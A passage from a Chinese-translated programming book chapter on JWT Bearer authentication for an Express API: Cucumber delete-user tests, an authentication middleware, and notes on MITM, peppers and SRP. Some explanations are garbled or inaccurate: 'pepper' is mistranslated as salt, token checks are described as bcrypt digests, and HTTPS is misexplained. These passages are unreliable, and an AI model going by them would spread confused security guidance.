
既然我们已经决定使用 `Bearer` 方案通过 `Authorization` 头部附加我们的令牌，我们的下一步是为此认证系统编写测试。对于我们的用例，让我们假设所有更改用户文档的端点（即，所有 `POST`、`PATCH` 和 `PUT` 请求，除了 `/login`）都需要一个令牌，其中 `sub` 属性与用户的 ID 匹配。

和往常一样，我们通过编写测试开始开发。让我们从删除用户端点开始，它应该响应如下：

+   `200 OK` 如果 `Authorization` 头部设置为格式良好的凭证（例如，它具有 `username:bcrypt-digest` 的结构。我们将在下一步验证这些凭证是否与真实用户相对应；现在，我们只关心它是否有正确的结构。）

+   如果 `Authorization` 头部已设置但其值不是格式良好的，则返回 `400 Bad Request`。

+   如果 `Authorization` 头部根本未设置，或者凭证与指定的用户不匹配，则返回 `401 Unauthorized`。

+   如果用户尝试删除另一个用户，则返回 `403 Forbidden`。

+   如果要删除的用户找不到，则返回 `404 Not Found`。

# 特性和场景

我们必须修改现有的删除用户 E2E 测试，以包括这些新场景；最终结果可能看起来像这样：

```js
Feature: Delete User by ID

  Clients should be able to send a request to our API in order to delete a user.

  Background: Create two Users and logs in with the first user's account

    Given 2 new users are created with random password and email
    And the client creates a POST request to /login
    And attaches a valid Login payload
    And sends the request
    And saves the response text in the context under token

  Scenario Outline: Wrong Authorization Header Scheme

    When the client creates a DELETE request to /users/:userId
    And set the HTTP header field "Authorization" to "<header>"
    And sends the request
    Then our API should respond with a 400 HTTP status code
    And the payload of the response should be a JSON object
    And contains a message property which says "The Authorization header should use the Bearer scheme"

    Examples:

    | header                |
    | Basic e@ma.il:hunter2 |

  Scenario Outline: Invalid Token Format

    When the client creates a DELETE request to /users/:userId
    And set the HTTP header field "Authorization" to "Bearer <token>"
    And sends the request
    Then our API should respond with a 400 HTTP status code
    And the payload of the response should be a JSON object
    And contains a message property which says "The credentials used in the Authorization header should be a valid bcrypt digest"

    Examples:

    | token                                                        |
    |                                                              |
    | 6g3$d21"dfG9),Ol;UD6^UG4D£SWerCSfgiJH323£!AzxDCftg7yhjYTEESF |
    | $2a$10$BZze4nPsa1D8AlCue76.sec8Z/Wn5BoG4kXgPqoEfYXxZuD27PQta |

  Scenario: Delete Self with Token with Wrong Signature

    The user is trying to delete its own account, the token contains the correct payload, but the signature is wrong.

    When the client creates a DELETE request to /users/:userId
    And sets the Authorization header to a token with wrong signature
    And sends the request
    Then our API should respond with a 400 HTTP status code
    And the payload of the response should be a JSON object
    And contains a message property which says "Invalid signature in token"

  Scenario: Delete Self

    When the client creates a DELETE request to /users/:userId
    And sets the Authorization header to a valid token
    And sends the request
    Then our API should respond with a 200 HTTP status code

    When the client creates a GET request to /users/:userId
    And sends the request
    Then our API should respond with a 404 HTTP status code

  Scenario: Delete Non-existing User

    When the client creates a DELETE request to /users/:userId
    And sets the Authorization header to a valid token
    And sends the request
    Then our API should respond with a 200 HTTP status code

    When the client creates a DELETE request to /users/:userId
    And sets the Authorization header to a valid token
    And sends the request
    Then our API should respond with a 404 HTTP status code

  Scenario: Delete Different User

    A user can only delete him/herself. When trying to delete another user, it should return with 403 Forbidden.

    When the client creates a DELETE request to /users/:users.1.id
    And sets the Authorization header to a valid token
    And sends the request
    Then our API should respond with a 403 HTTP status code
    And the payload of the response should be a JSON object
    And contains a message property which says "Permission Denied. Can only delete yourself, not other users."
```

首先，我们将测试的背景从创建一个用户改为创建两个用户；我们这样做是为了稍后测试一个用户尝试删除另一个用户的场景。此外，我们还在后台登录用户并将返回的认证令牌保存到上下文中。

然后，我们为 `Authorization` 头部添加了一些测试，确保其格式正确，其值看起来格式良好，并且签名有效。最后，我们添加了确保只有用户可以删除自己的测试。如果他/她尝试删除另一个用户，将会返回一个 `403 Forbidden` 错误。

# 实现步骤定义

然后，在 `spec/cucumber/steps/request.js` 中实现以下步骤定义：

```js
When(/^set the HTTP header field (?:"|')?([\w-]+)(?:"|')? to (?:"|')?(.+)(?:"|')?$/, function (headerName, value) {
  this.request.set(headerName, value);
});

When(/^sets the Authorization header to a valid token$/, function () {
  this.request.set('Authorization', `Bearer ${this.token}`);
});

When(/^sets the Authorization header to a token with wrong signature$/, function () {
  // Appending anything to the end of the signature will invalidate it
  const tokenWithInvalidSignature = `${this.token}a`;
  this.request.set('Authorization', `Bearer ${tokenWithInvalidSignature}`);
});
```

# 验证请求中的摘要

现在我们已经添加了测试，是时候实现这个功能了。既然我们知道我们想要检查大多数请求的令牌，我们不应该仅在删除用户引擎中定义令牌验证逻辑。相反，我们应该将所有通用验证步骤（例如，令牌是有效的 JWT，签名格式良好等）抽象到中间件中。

首先，在 `src/middlewares/authenticate/index.js` 创建一个包含以下模板的文件：

```js
function authenticate (req, res, next) {}
export default authenticate;
```

首先，我们希望允许任何人获取单个用户和搜索用户；因此，当请求是`GET`请求时，我们不需要验证令牌。在认证函数的顶部添加以下检查：

```js
if (req.method === 'GET') { return next(); }
```

通常，在浏览器发送 CORS 请求之前，它会发送一个**预检请求**来检查是否理解 CORS 协议。此请求使用`OPTIONS`方法，因此我们也不需要验证`OPTIONS`请求的令牌：

```js
if (req.method === 'GET' || req.method === 'OPTIONS') { return next(); }
```

接下来，我们还想让未认证的用户能够调用创建用户和登录端点。在上一行下面，添加以下早期返回检查：

```js
if (req.method === 'POST' && req.path === '/users') { return next(); }
if (req.method === 'POST' && req.path === '/login') { return next(); }
```

对于任何其他端点，都需要`Authorization`头。因此，我们将接下来检查`Authorization`头是否存在。如果头未设置，则返回`401 Unauthorizated`错误：

```js
const authorization = req.get('Authorization');

if (authorization === undefined) {
  res.status(401);
  res.set('Content-Type', 'application/json');
  return res.json({ message: 'The Authorization header must be set' });
}
```

接下来，我们检查`Authorization`的值是否有效。首先，我们可以使用以下代码来检查是否指定了方案，并将其设置为值`"Bearer"`：

```js
const [scheme, token] = authorization.split(' ');
if (scheme !== 'Bearer') {
  res.status(400);
  res.set('Content-Type', 'application/json');
  return res.json({ message: 'The Authorization header should use the Bearer scheme' });
}
```

然后，我们将检查令牌是否是有效的 JWT。我们通过指定一个正则表达式并检查在头中指定的令牌是否符合此正则表达式来完成此操作。这使用了`jsonwebtoken`库，所以请确保在顶部导入它：

```js
const jwtRegEx = /^[\w-]+\.[\w-]+\.[\w-.+/=]*$/;

// If no token was provided, or the token is not a valid JWT token, return with a 400
if (!token || !jwtRegEx.test(token)) {
  res.status(400);
  res.set('Content-Type', 'application/json');
  return res.json({ message: 'The credentials used in the Authorization header should be a valid bcrypt digest' });
}
```

我们已经完成了所有相对资源密集型任务，并在这些基本条件不满足时提前退出。在这个中间件的最后一步，我们将实际上使用验证方法来检查负载是否是有效的 JSON 对象，签名是否有效。如果是，那么我们将向`req`对象添加一个带有用户 ID 的`user`属性：

```js
import { JsonWebTokenError, verify } from 'jsonwebtoken';

verify(token, process.env.PUBLIC_KEY, { algorithms: ['RS512'] }, (err, decodedToken) => {
  if (err) {
    if (err instanceof JsonWebTokenError && err.message === 'invalid signature') {
      res.status(400);
      res.set('Content-Type', 'application/json');
      return res.json({ message: 'Invalid signature in token' });
    }
    res.status(500);
    res.set('Content-Type', 'application/json');
    return res.json({ message: 'Internal Server Error' });
  }
  req.user = Object.assign({}, req.user, { id: decodedToken.sub });
  return next();
});
```

要应用中间件，请将其添加到`src/index.js`中，在其他所有中间件之后，但在路由定义之前：

```js
import authenticate from './middlewares/authenticate';
...
app.use(bodyParser.json({ limit: 1e6 }));
app.use(authenticate);
app.get('/salt', ...);
...
```

然而，我们还没有完成。中间件仅验证令牌，但它仍然不能阻止用户删除另一个用户。为了实现这一点，请将以下行添加到删除用户引擎的顶部：

```js
if (req.params.userId !== req.user.id) {
 return Promise.reject(new Error('Forbidden'));
}
```

在删除用户处理程序中，定义一个 if 块来捕获`Forbidden`错误并返回`403 Forbidden`状态码：

```js
function del(req, res) {
  return engine(req)
    .then(() => { ... })
    .catch((err) => {
      if (err.message === 'Not Found') { ... }
      if (err.message === 'Forbidden') {
        res.status(403);
        res.set('Content-Type', 'application/json');
        res.json({ message: 'Permission Denied. Can only delete yourself, not other users.' });
        return err;
      }
      ...
    })
}
```

如果我们运行删除用户端点的端到端测试，它们都应该通过！现在，按照相同的步骤将身份验证和授权逻辑添加到替换个人资料和更新个人资料端点。首先更新端到端测试，然后更新引擎和处理程序以处理用户尝试执行他们无权执行的操作的情况。

此外，更新单元和集成测试，如果觉得有必要，添加更多测试，然后将代码提交到远程仓库。

如果遇到困难，请查看我们提供的代码包中的实现。在进入下一章之前做这件事。

# 下一步

如我们在本章开头提到的，我们在这里提出的认证/授权方案非常基础，你需要采取进一步的步骤来真正确保其安全性。在这里，我们将简要介绍一些你可以实施的措施来进一步提高你 API 的安全性。

# 防止中间人（MITM）攻击

目前，我们依赖于客户端在发送到网络之前对他们的密码进行哈希处理。我们这样做是为了让我们的客户端不必信任我们的 API 服务器来处理他们的凭证。摘要现在实际上被用作密码。

然而，任何位于我们的客户端和服务器之间的代理服务器都能够读取摘要，并可以使用这些“被盗”的凭证进行认证，伪装成我们的客户端。

另一个问题是我们虽然能够验证客户端，但客户端没有验证我们服务器身份的方法。同样，代理服务器可以伪装成我们的 API 服务器，诱骗客户端向它们发送敏感信息。

要可靠地防止这两个问题的唯一方法是在连接上实施**端到端加密**（**E2EE**），使用**超文本传输协议安全**（**HTTPS**），这是 HTTP 的安全版本。要使用 HTTPS，你需要为你的域名设置 SSL/TLS 证书，并将该证书注册到一个建立良好且信誉良好的**证书颁发机构**（**CA**）。

当客户端想要通过 HTTPS 安全地发送一个 HTTP 消息（可能包含凭证）时，他们会向 CA 请求我们网站的证书，并使用该证书加密 HTTP 消息。加密会隐藏消息并防止第三方解密消息。只有服务器才有解密此消息的密钥，所以即使有恶意代理服务器拦截消息，它们也无法理解它。

在 OWASP 网站上了解更多关于中间人攻击的信息：[owasp.org/index.php/Man-in-the-middle_attack](https://www.owasp.org/index.php/Man-in-the-middle_attack)。

如果你想在 API 上启用 HTTPS，Linux Foundation 提供了一个名为 Let's Encrypt 的免费 CA（[letsencrypt.org](https://letsencrypt.org/)）。它还提供了一个名为 Certbot 的工具（[certbot.eff.org](https://certbot.eff.org/)），它允许你自动部署 Let's Encrypt 证书。不妨试试看！

# 加密摘要

使用我们当前的方案，客户端创建的摘要直接存储在数据库中。现在，如果黑客能够访问数据库服务器，他们就能够以任何用户的身份进行认证。此外，由于攻击者将同时拥有摘要和盐值，他们可能能够通过暴力破解用户的密码。

一种减轻这种问题的方法是用一个**盐值**——盐值的一种变体，具有以下不同之处：

+   盐值不是公开的

+   盐值不存储在数据库中，而是在另一个应用服务器上，这样盐值和盐值就分开了

+   pepper 可能是一个在应用程序服务器中设置为环境变量的常量

这就是使用 pepper 的身份验证方法将如何工作：客户端将加盐的密码摘要发送到服务器，服务器再次使用 pepper 对摘要进行哈希处理，并将双哈希摘要存储在数据库中。

现在，如果一个黑客能够访问数据库服务器（但不是应用程序代码），他/她将能够获得密码摘要和盐，但由于他/她不知道 pepper（或者更好的是，甚至不知道 pepper 的存在），他/她将无法使用摘要进行身份验证（因为我们的服务器会再次对其进行哈希处理，而得到的哈希值将不会与数据库中我们拥有的摘要匹配）。此外，即使攻击者花费时间和资源进行暴力破解，他们也无法推导出原始密码。

然而，只有当您的应用程序服务器安全时，pepper 才是有用的。如果秘密 pepper 任何时候被知晓，它就不能被撤回，因为所有我们的密码都是与 pepper 哈希的；由于哈希是一个单向过程，我们无法使用新的 pepper 重新生成所有密码哈希。无法轮换这个秘密 pepper 使得这种类型的 pepper 无法维护。

作为替代方案，可以不重新哈希加盐的密码摘要，而是使用可逆的**块加密**来可逆地加密摘要。

# 块加密

块加密是一种用于**对称密钥加密**的算法，它接受两个参数——一个**明文**和一个**密钥**，并将它们通过算法进行处理以生成一个**密文**。其想法是生成一个看似随机的密文，以便无法从密文中推断出明文输入（就像哈希一样）：

```js
const ciphertext = encrypt(plaintext, key);
```

然而，与哈希不同，块加密是可逆的；给定密文和密钥，可以重新生成明文：

```js
const plaintext = decrypt(ciphertext, key);
```

在我们的摘要上使用块加密而不是应用 pepper 意味着，如果我们的应用程序服务器（以及因此 pepper）被破坏，我们可以在数据库上运行一个简单的函数，将密文解密回摘要，并使用新的密钥重新加密。

# 探索安全的远程密码（SRP）协议

**安全远程密码协议**（**SRP**）是一个行业标准协议，用于基于密码的认证和密钥交换。像我们的基本方案一样，密码永远不需要离开客户端。它能够在以下情况下安全地验证用户：

+   攻击者完全了解协议

+   攻击者可以访问一个常用密码的大字典

+   攻击者可以监听客户端和服务器之间的所有通信

+   攻击者可以拦截、修改和伪造客户端和服务器之间的任意消息

+   没有可用的相互信任的第三方

此列表是从 SRP 的官方网站提取的 ([srp.stanford.edu/whatisit.html](http://srp.stanford.edu/whatisit.html))

SRP 被**亚马逊网络服务**（**AWS**）和苹果的 iCloud 等使用。所以如果你对安全性感兴趣，我建议你阅读一些关于 SRP 的资料！

# 摘要

在本章中，我们实现了允许用户对我们的 API 服务器进行身份验证的逻辑。我们还使用了 JSON Web Tokens 来保持我们的应用程序无状态；当我们想要扩展应用程序时，这一点很重要，我们将在第十八章“使用 Kubernetes 的强大基础设施”中讨论这一点。

然而，重要的是要记住，安全性并非易事。在本章中我们所涵盖的只是这个谜题的一小部分。你应该将本章视为保护你的应用程序的第一步，并且始终关注最新的安全漏洞和最佳实践。

在下一章中，我们将通过使用**OpenAPI**和**Swagger**来记录我们的 API，来完成我们的后端 API。
